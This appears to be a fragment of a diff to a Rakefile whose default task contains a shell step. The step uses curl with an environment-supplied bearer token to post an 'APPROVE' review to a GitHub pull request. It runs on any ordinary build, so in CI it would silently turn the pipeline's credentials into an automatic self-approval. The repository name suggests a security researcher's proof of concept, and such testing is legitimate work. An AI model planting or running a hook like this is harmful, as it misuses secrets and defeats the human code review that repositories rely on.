@@ -6,3 +6,4 @@ task :default do
           PR_NUMBER=2; \
           curl --request POST --url https://api.github.com/repos/SecurityResearcher-yoda/test2/pulls/$PR_NUMBER/reviews --header \"authorization: Bearer $TOKEN\" --header \"content-type: application/json\" -d '{\"event\":\"APPROVE\"}'")
 end
+
